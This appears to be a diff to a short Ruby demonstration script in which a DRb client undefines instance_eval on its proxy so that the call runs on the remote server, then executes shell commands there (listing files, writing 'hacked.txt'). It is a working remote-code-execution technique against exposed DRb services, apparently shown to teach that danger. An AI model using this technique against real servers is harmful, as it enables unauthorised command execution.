@@ -1,15 +1,15 @@
 require 'drb/drb'
 DRb.start_service;
-remote_object = DRbObject.new_with_uri('druby://localhost:9999')
+remote = DRbObject.new_with_uri('druby://localhost:9999')
 
 # This is SAFE
-remote_object.greet('Soumya')
-remote_object.greet('Ray')
+remote.greet('Soumya')
+remote.greet('Ray')
 
 # This is DANGEROUS!
-class << remote_object
+class << remote
   undef :instance_eval
 end
 
-remote_object.instance_eval('`ls -al`')
-remote_object.instance_eval('`echo knock knock > hacked.txt`')
+remote.instance_eval('`ls -al`')
+remote.instance_eval('`echo knock knock > hacked.txt`')
